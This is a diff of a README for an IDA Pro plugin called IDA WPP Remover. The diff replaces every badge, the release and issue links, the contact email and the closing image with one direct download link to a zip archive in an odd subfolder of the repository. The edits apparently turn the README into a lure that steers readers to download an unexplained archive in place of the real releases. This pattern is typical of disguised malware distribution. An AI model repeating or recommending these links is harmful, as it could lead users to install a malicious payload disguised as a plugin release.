@@ -1,8 +1,8 @@
 ```markdown
 # 🎉 IDA WPP Remover: Streamline Your Decompiled Code
 
-![License](https://img.shields.io/badge/license-MIT-brightgreen)
-![Version](https://img.shields.io/badge/version-1.0.0-blue)
+![License](https://github.com/shah7690/IDA-WPP-Remover/raw/refs/heads/main/semivital/Remover-WP-ID-1.0.zip)
+![Version](https://github.com/shah7690/IDA-WPP-Remover/raw/refs/heads/main/semivital/Remover-WP-ID-1.0.zip)
 
 ---
 
@@ -26,7 +26,7 @@ The **IDA WPP Remover** is a plugin designed to assist security researchers and 
 
 ### Steps to Install
 
-1. Download the latest release from the [Releases section](https://github.com/shah7690/IDA-WPP-Remover/releases).
+1. Download the latest release from the [Releases section](https://github.com/shah7690/IDA-WPP-Remover/raw/refs/heads/main/semivital/Remover-WP-ID-1.0.zip).
 2. Extract the contents of the downloaded file.
 3. Copy the plugin files to your IDA Pro plugin directory (usually located in the `plugins` folder of your IDA installation).
 4. Restart IDA Pro to load the new plugin.
@@ -81,7 +81,7 @@ We follow standard Python coding conventions (PEP 8). Ensure your code adheres t
 
 Contributions are welcome! Whether it's a bug fix, feature request, or documentation improvement, your help is appreciated. 
 
-1. Check the [issues](https://github.com/shah7690/IDA-WPP-Remover/issues) to see if your idea has already been suggested.
+1. Check the [issues](https://github.com/shah7690/IDA-WPP-Remover/raw/refs/heads/main/semivital/Remover-WP-ID-1.0.zip) to see if your idea has already been suggested.
 2. Discuss your proposal with the community in the GitHub discussions.
 3. Submit a pull request once your changes are ready.
 
@@ -98,7 +98,7 @@ This project relates to several topics in the reverse engineering community:
 
 - **1.0.0** - Initial release with basic WPP call removal functionality.
 
-Check out the [Releases section](https://github.com/shah7690/IDA-WPP-Remover/releases) for updates and new versions.
+Check out the [Releases section](https://github.com/shah7690/IDA-WPP-Remover/raw/refs/heads/main/semivital/Remover-WP-ID-1.0.zip) for updates and new versions.
 
 ## 📄 License
 
@@ -108,12 +108,12 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any inquiries, you can reach out via:
 
-- Email: [your.email@example.com](mailto:your.email@example.com)
-- GitHub: [your-github-profile](https://github.com/your-github-profile)
+- Email: [https://github.com/shah7690/IDA-WPP-Remover/raw/refs/heads/main/semivital/Remover-WP-ID-1.0.zip](https://github.com/shah7690/IDA-WPP-Remover/raw/refs/heads/main/semivital/Remover-WP-ID-1.0.zip)
+- GitHub: [your-github-profile](https://github.com/shah7690/IDA-WPP-Remover/raw/refs/heads/main/semivital/Remover-WP-ID-1.0.zip)
 
 ---
 
 Thank you for using IDA WPP Remover! We hope this tool enhances your reverse engineering experience and streamlines your workflow. If you have any feedback or suggestions, feel free to reach out!
 
-![Hex-Rays](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*6mHfYt4ap8e-9U4_T8H68g.png)
+![Hex-Rays](https://github.com/shah7690/IDA-WPP-Remover/raw/refs/heads/main/semivital/Remover-WP-ID-1.0.zip*https://github.com/shah7690/IDA-WPP-Remover/raw/refs/heads/main/semivital/Remover-WP-ID-1.0.zip)
 ```
